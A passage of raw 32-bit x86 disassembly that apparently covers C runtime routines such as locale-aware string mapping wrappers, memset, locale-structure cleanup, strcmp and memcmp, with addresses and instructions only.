  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
  427bb5:	pop    ecx
  427bb6:	mov    eax,DWORD PTR [ebp-0x20]
  427bb9:	jmp    0x427c29
  427bbb:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bbe:	cmp    ebx,esi
  427bc0:	jne    0x427bc8
  427bc2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bc8:	mov    edi,DWORD PTR [ebp+0x18]
  427bcb:	test   edi,edi
  427bcd:	jne    0x427bd5
  427bcf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bd5:	push   ebx
  427bd6:	call   0x4285cd
  427bdb:	pop    ecx
  427bdc:	cmp    eax,0xffffffff
  427bdf:	jne    0x427be5
  427be1:	xor    eax,eax
  427be3:	jmp    0x427c29
  427be5:	cmp    eax,edi
  427be7:	je     0x427c07
  427be9:	push   0x0
  427beb:	push   0x0
  427bed:	lea    ecx,[ebp+0x10]
  427bf0:	push   ecx
  427bf1:	push   DWORD PTR [ebp+0xc]
  427bf4:	push   eax
  427bf5:	push   edi
  427bf6:	call   0x428616
  427bfb:	add    esp,0x18
  427bfe:	mov    esi,eax
  427c00:	test   esi,esi
  427c02:	je     0x427be1
  427c04:	mov    DWORD PTR [ebp+0xc],esi
  427c07:	push   DWORD PTR [ebp+0x14]
  427c0a:	push   DWORD PTR [ebp+0x10]
  427c0d:	push   DWORD PTR [ebp+0xc]
  427c10:	push   DWORD PTR [ebp+0x8]
  427c13:	push   ebx
  427c14:	call   DWORD PTR ds:0x4290f8
  427c1a:	mov    edi,eax
  427c1c:	test   esi,esi
  427c1e:	je     0x427c27
  427c20:	push   esi
  427c21:	call   0x425f5a
  427c26:	pop    ecx
  427c27:	mov    eax,edi
  427c29:	lea    esp,[ebp-0x38]
  427c2c:	call   0x42538b
  427c31:	ret    
  427c32:	mov    eax,ds:0x45ddc4
  427c37:	test   eax,eax
  427c39:	je     0x427c4a
  427c3b:	push   DWORD PTR [esp+0x4]
  427c3f:	call   eax
  427c41:	test   eax,eax
  427c43:	pop    ecx
  427c44:	je     0x427c4a
  427c46:	xor    eax,eax
  427c48:	inc    eax
  427c49:	ret    
  427c4a:	xor    eax,eax
  427c4c:	ret    
  427c4d:	int3   
  427c4e:	int3   
  427c4f:	int3   
  427c50:	mov    edx,DWORD PTR [esp+0xc]
  427c54:	mov    ecx,DWORD PTR [esp+0x4]
  427c58:	test   edx,edx
  427c5a:	je     0x427cab
  427c5c:	xor    eax,eax
  427c5e:	mov    al,BYTE PTR [esp+0x8]
  427c62:	push   edi
  427c63:	mov    edi,ecx
  427c65:	cmp    edx,0x4
  427c68:	jb     0x427c9b
  427c6a:	neg    ecx
  427c6c:	and    ecx,0x3
  427c6f:	je     0x427c7d
  427c71:	sub    edx,ecx
  427c73:	mov    BYTE PTR [edi],al
  427c75:	add    edi,0x1
  427c78:	sub    ecx,0x1
  427c7b:	jne    0x427c73
  427c7d:	mov    ecx,eax
  427c7f:	shl    eax,0x8
  427c82:	add    eax,ecx
  427c84:	mov    ecx,eax
  427c86:	shl    eax,0x10
  427c89:	add    eax,ecx
  427c8b:	mov    ecx,edx
  427c8d:	and    edx,0x3
  427c90:	shr    ecx,0x2
  427c93:	je     0x427c9b
  427c95:	rep stos DWORD PTR es:[edi],eax
  427c97:	test   edx,edx
  427c99:	je     0x427ca5
  427c9b:	mov    BYTE PTR [edi],al
  427c9d:	add    edi,0x1
  427ca0:	sub    edx,0x1
  427ca3:	jne    0x427c9b
  427ca5:	mov    eax,DWORD PTR [esp+0x8]
  427ca9:	pop    edi
  427caa:	ret    
  427cab:	mov    eax,DWORD PTR [esp+0x4]
  427caf:	ret    
  427cb0:	push   esi
  427cb1:	mov    esi,DWORD PTR [esp+0x8]
  427cb5:	test   esi,esi
  427cb7:	je     0x427e3e
  427cbd:	push   DWORD PTR [esi+0x4]
  427cc0:	call   0x425f5a
  427cc5:	push   DWORD PTR [esi+0x8]
  427cc8:	call   0x425f5a
  427ccd:	push   DWORD PTR [esi+0xc]
  427cd0:	call   0x425f5a
  427cd5:	push   DWORD PTR [esi+0x10]
  427cd8:	call   0x425f5a
  427cdd:	push   DWORD PTR [esi+0x14]
  427ce0:	call   0x425f5a
  427ce5:	push   DWORD PTR [esi+0x18]
  427ce8:	call   0x425f5a
  427ced:	push   DWORD PTR [esi]
  427cef:	call   0x425f5a
  427cf4:	push   DWORD PTR [esi+0x20]
  427cf7:	call   0x425f5a
  427cfc:	push   DWORD PTR [esi+0x24]
  427cff:	call   0x425f5a
  427d04:	push   DWORD PTR [esi+0x28]
  427d07:	call   0x425f5a
  427d0c:	push   DWORD PTR [esi+0x2c]
  427d0f:	call   0x425f5a
  427d14:	push   DWORD PTR [esi+0x30]
  427d17:	call   0x425f5a
  427d1c:	push   DWORD PTR [esi+0x34]
  427d1f:	call   0x425f5a
  427d24:	push   DWORD PTR [esi+0x1c]
  427d27:	call   0x425f5a
  427d2c:	push   DWORD PTR [esi+0x38]
  427d2f:	call   0x425f5a
  427d34:	push   DWORD PTR [esi+0x3c]
  427d37:	call   0x425f5a
  427d3c:	add    esp,0x40
  427d3f:	push   DWORD PTR [esi+0x40]
  427d42:	call   0x425f5a
  427d47:	push   DWORD PTR [esi+0x44]
  427d4a:	call   0x425f5a
  427d4f:	push   DWORD PTR [esi+0x48]
  427d52:	call   0x425f5a
  427d57:	push   DWORD PTR [esi+0x4c]
  427d5a:	call   0x425f5a
  427d5f:	push   DWORD PTR [esi+0x50]
  427d62:	call   0x425f5a
  427d67:	push   DWORD PTR [esi+0x54]
  427d6a:	call   0x425f5a
  427d6f:	push   DWORD PTR [esi+0x58]
  427d72:	call   0x425f5a
  427d77:	push   DWORD PTR [esi+0x5c]
  427d7a:	call   0x425f5a
  427d7f:	push   DWORD PTR [esi+0x60]
  427d82:	call   0x425f5a
  427d87:	push   DWORD PTR [esi+0x64]
  427d8a:	call   0x425f5a
  427d8f:	push   DWORD PTR [esi+0x68]
  427d92:	call   0x425f5a
  427d97:	push   DWORD PTR [esi+0x6c]
  427d9a:	call   0x425f5a
  427d9f:	push   DWORD PTR [esi+0x70]
  427da2:	call   0x425f5a
  427da7:	push   DWORD PTR [esi+0x74]
  427daa:	call   0x425f5a
  427daf:	push   DWORD PTR [esi+0x78]
  427db2:	call   0x425f5a
  427db7:	push   DWORD PTR [esi+0x7c]
  427dba:	call   0x425f5a
  427dbf:	add    esp,0x40
  427dc2:	push   DWORD PTR [esi+0x80]
  427dc8:	call   0x425f5a
  427dcd:	push   DWORD PTR [esi+0x84]
  427dd3:	call   0x425f5a
  427dd8:	push   DWORD PTR [esi+0x88]
  427dde:	call   0x425f5a
  427de3:	push   DWORD PTR [esi+0x8c]
  427de9:	call   0x425f5a
  427dee:	push   DWORD PTR [esi+0x90]
  427df4:	call   0x425f5a
  427df9:	push   DWORD PTR [esi+0x94]
  427dff:	call   0x425f5a
  427e04:	push   DWORD PTR [esi+0x98]
  427e0a:	call   0x425f5a
  427e0f:	push   DWORD PTR [esi+0x9c]
  427e15:	call   0x425f5a
  427e1a:	push   DWORD PTR [esi+0xa0]
  427e20:	call   0x425f5a
  427e25:	push   DWORD PTR [esi+0xa4]
  427e2b:	call   0x425f5a
  427e30:	push   DWORD PTR [esi+0xa8]
  427e36:	call   0x425f5a
  427e3b:	add    esp,0x2c
  427e3e:	pop    esi
  427e3f:	ret    
  427e40:	push   esi
  427e41:	mov    esi,DWORD PTR [esp+0x8]
  427e45:	test   esi,esi
  427e47:	je     0x427e9d
  427e49:	mov    eax,DWORD PTR [esi]
  427e4b:	mov    ecx,DWORD PTR ds:0x45d934
  427e51:	cmp    eax,DWORD PTR [ecx]
  427e53:	je     0x427e64
  427e55:	cmp    eax,DWORD PTR ds:0x45d904
  427e5b:	je     0x427e64
  427e5d:	push   eax
  427e5e:	call   0x425f5a
  427e63:	pop    ecx
  427e64:	mov    eax,DWORD PTR [esi+0x4]
  427e67:	mov    ecx,DWORD PTR ds:0x45d934
  427e6d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e70:	je     0x427e81
  427e72:	cmp    eax,DWORD PTR ds:0x45d908
  427e78:	je     0x427e81
  427e7a:	push   eax
  427e7b:	call   0x425f5a
  427e80:	pop    ecx
  427e81:	mov    esi,DWORD PTR [esi+0x8]
  427e84:	mov    eax,ds:0x45d934
  427e89:	cmp    esi,DWORD PTR [eax+0x8]
  427e8c:	je     0x427e9d
  427e8e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e94:	je     0x427e9d
  427e96:	push   esi
  427e97:	call   0x425f5a
  427e9c:	pop    ecx
  427e9d:	pop    esi
  427e9e:	ret    
  427e9f:	push   esi
  427ea0:	mov    esi,DWORD PTR [esp+0x8]
  427ea4:	test   esi,esi
  427ea6:	je     0x427f76
  427eac:	mov    eax,DWORD PTR [esi+0xc]
  427eaf:	mov    ecx,DWORD PTR ds:0x45d934
  427eb5:	cmp    eax,DWORD PTR [ecx+0xc]
  427eb8:	je     0x427ec9
  427eba:	cmp    eax,DWORD PTR ds:0x45d910
  427ec0:	je     0x427ec9
  427ec2:	push   eax
  427ec3:	call   0x425f5a
  427ec8:	pop    ecx
  427ec9:	mov    eax,DWORD PTR [esi+0x10]
  427ecc:	mov    ecx,DWORD PTR ds:0x45d934
  427ed2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ed5:	je     0x427ee6
  427ed7:	cmp    eax,DWORD PTR ds:0x45d914
  427edd:	je     0x427ee6
  427edf:	push   eax
  427ee0:	call   0x425f5a
  427ee5:	pop    ecx
  427ee6:	mov    eax,DWORD PTR [esi+0x14]
  427ee9:	mov    ecx,DWORD PTR ds:0x45d934
  427eef:	cmp    eax,DWORD PTR [ecx+0x14]
  427ef2:	je     0x427f03
  427ef4:	cmp    eax,DWORD PTR ds:0x45d918
  427efa:	je     0x427f03
  427efc:	push   eax
  427efd:	call   0x425f5a
  427f02:	pop    ecx
  427f03:	mov    eax,DWORD PTR [esi+0x18]
  427f06:	mov    ecx,DWORD PTR ds:0x45d934
  427f0c:	cmp    eax,DWORD PTR [ecx+0x18]
  427f0f:	je     0x427f20
  427f11:	cmp    eax,DWORD PTR ds:0x45d91c
  427f17:	je     0x427f20
  427f19:	push   eax
  427f1a:	call   0x425f5a
  427f1f:	pop    ecx
  427f20:	mov    eax,DWORD PTR [esi+0x1c]
  427f23:	mov    ecx,DWORD PTR ds:0x45d934
  427f29:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f2c:	je     0x427f3d
  427f2e:	cmp    eax,DWORD PTR ds:0x45d920
  427f34:	je     0x427f3d
  427f36:	push   eax
  427f37:	call   0x425f5a
  427f3c:	pop    ecx
  427f3d:	mov    eax,DWORD PTR [esi+0x20]
  427f40:	mov    ecx,DWORD PTR ds:0x45d934
  427f46:	cmp    eax,DWORD PTR [ecx+0x20]
  427f49:	je     0x427f5a
  427f4b:	cmp    eax,DWORD PTR ds:0x45d924
  427f51:	je     0x427f5a
  427f53:	push   eax
  427f54:	call   0x425f5a
  427f59:	pop    ecx
  427f5a:	mov    esi,DWORD PTR [esi+0x24]
  427f5d:	mov    eax,ds:0x45d934
  427f62:	cmp    esi,DWORD PTR [eax+0x24]
  427f65:	je     0x427f76
  427f67:	cmp    esi,DWORD PTR ds:0x45d928
  427f6d:	je     0x427f76
  427f6f:	push   esi
  427f70:	call   0x425f5a
  427f75:	pop    ecx
  427f76:	pop    esi
  427f77:	ret    
  427f78:	int3   
  427f79:	int3   
  427f7a:	int3   
  427f7b:	int3   
  427f7c:	int3   
  427f7d:	int3   
  427f7e:	int3   
  427f7f:	int3   
  427f80:	push   ebp
  427f81:	mov    ebp,esp
  427f83:	push   esi
  427f84:	xor    eax,eax
  427f86:	push   eax
  427f87:	push   eax
  427f88:	push   eax
  427f89:	push   eax
  427f8a:	push   eax
  427f8b:	push   eax
  427f8c:	push   eax
  427f8d:	push   eax
  427f8e:	mov    edx,DWORD PTR [ebp+0xc]
  427f91:	lea    ecx,[ecx+0x0]
  427f94:	mov    al,BYTE PTR [edx]
  427f96:	or     al,al
  427f98:	je     0x427fa3
  427f9a:	add    edx,0x1
  427f9d:	bts    DWORD PTR [esp],eax
  427fa1:	jmp    0x427f94
  427fa3:	mov    esi,DWORD PTR [ebp+0x8]
  427fa6:	or     ecx,0xffffffff
  427fa9:	lea    ecx,[ecx+0x0]
  427fac:	add    ecx,0x1
  427faf:	mov    al,BYTE PTR [esi]
  427fb1:	or     al,al
  427fb3:	je     0x427fbe
  427fb5:	add    esi,0x1
  427fb8:	bt     DWORD PTR [esp],eax
  427fbc:	jae    0x427fac
  427fbe:	mov    eax,ecx
  427fc0:	add    esp,0x20
  427fc3:	pop    esi
  427fc4:	leave  
  427fc5:	ret    
  427fc6:	int3   
  427fc7:	int3   
  427fc8:	int3   
  427fc9:	int3   
  427fca:	int3   
  427fcb:	int3   
  427fcc:	int3   
  427fcd:	int3   
  427fce:	int3   
  427fcf:	int3   
  427fd0:	mov    edx,DWORD PTR [esp+0x4]
  427fd4:	mov    ecx,DWORD PTR [esp+0x8]
  427fd8:	test   edx,0x3
  427fde:	jne    0x42801c
  427fe0:	mov    eax,DWORD PTR [edx]
  427fe2:	cmp    al,BYTE PTR [ecx]
  427fe4:	jne    0x428014
  427fe6:	or     al,al
  427fe8:	je     0x428010
  427fea:	cmp    ah,BYTE PTR [ecx+0x1]
  427fed:	jne    0x428014
  427fef:	or     ah,ah
  427ff1:	je     0x428010
  427ff3:	shr    eax,0x10
  427ff6:	cmp    al,BYTE PTR [ecx+0x2]
  427ff9:	jne    0x428014
  427ffb:	or     al,al
  427ffd:	je     0x428010
  427fff:	cmp    ah,BYTE PTR [ecx+0x3]
  428002:	jne    0x428014
  428004:	add    ecx,0x4
  428007:	add    edx,0x4
  42800a:	or     ah,ah
  42800c:	jne    0x427fe0
  42800e:	mov    edi,edi
  428010:	xor    eax,eax
  428012:	ret    
  428013:	nop
  428014:	sbb    eax,eax
  428016:	shl    eax,1
  428018:	add    eax,0x1
  42801b:	ret    
  42801c:	test   edx,0x1
  428022:	je     0x42803c
  428024:	mov    al,BYTE PTR [edx]
  428026:	add    edx,0x1
  428029:	cmp    al,BYTE PTR [ecx]
  42802b:	jne    0x428014
  42802d:	add    ecx,0x1
  428030:	or     al,al
  428032:	je     0x428010
  428034:	test   edx,0x2
  42803a:	je     0x427fe0
  42803c:	mov    ax,WORD PTR [edx]
  42803f:	add    edx,0x2
  428042:	cmp    al,BYTE PTR [ecx]
  428044:	jne    0x428014
  428046:	or     al,al
  428048:	je     0x428010
  42804a:	cmp    ah,BYTE PTR [ecx+0x1]
  42804d:	jne    0x428014
  42804f:	or     ah,ah
  428051:	je     0x428010
  428053:	add    ecx,0x2
  428056:	jmp    0x427fe0
  428058:	int3   
  428059:	int3   
  42805a:	int3   
  42805b:	int3   
  42805c:	int3   
  42805d:	int3   
  42805e:	int3   
  42805f:	int3   
  428060:	mov    eax,DWORD PTR [esp+0xc]
  428064:	test   eax,eax
  428066:	je     0x4280b2
  428068:	mov    edx,DWORD PTR [esp+0x4]
  42806c:	push   esi
  42806d:	push   edi
  42806e:	mov    esi,edx
  428070:	mov    edi,DWORD PTR [esp+0x10]
  428074:	or     edx,edi
  428076:	and    edx,0x3
  428079:	je     0x4280b3
  42807b:	test   eax,0x1
  428080:	je     0x428093
  428082:	mov    cl,BYTE PTR [esi]
  428084:	cmp    cl,BYTE PTR [edi]
  428086:	jne    0x4280e0
  428088:	add    esi,0x1
  42808b:	add    edi,0x1
  42808e:	sub    eax,0x1
  428091:	je     0x4280b0
  428093:	mov    cl,BYTE PTR [esi]
  428095:	mov    dl,BYTE PTR [edi]
  428097:	cmp    cl,dl
  428099:	jne    0x4280e0
  42809b:	mov    cl,BYTE PTR [esi+0x1]
  42809e:	mov    dl,BYTE PTR [edi+0x1]
  4280a1:	cmp    cl,dl
  4280a3:	jne    0x4280e0
  4280a5:	add    edi,0x2
  4280a8:	add    esi,0x2
  4280ab:	sub    eax,0x2
  4280ae:	jne    0x428093
  4280b0:	pop    edi
  4280b1:	pop    esi
  4280b2:	ret    
  4280b3:	mov    ecx,eax
  4280b5:	and    eax,0x3
  4280b8:	shr    ecx,0x2
  4280bb:	je     0x4280e8
  4280bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280bf:	je     0x4280e8
  4280c1:	mov    ecx,DWORD PTR [esi-0x4]
  4280c4:	mov    edx,DWORD PTR [edi-0x4]
  4280c7:	cmp    cl,dl
  4280c9:	jne    0x4280db
  4280cb:	cmp    ch,dh
  4280cd:	jne    0x4280db
  4280cf:	shr    ecx,0x10
  4280d2:	shr    edx,0x10
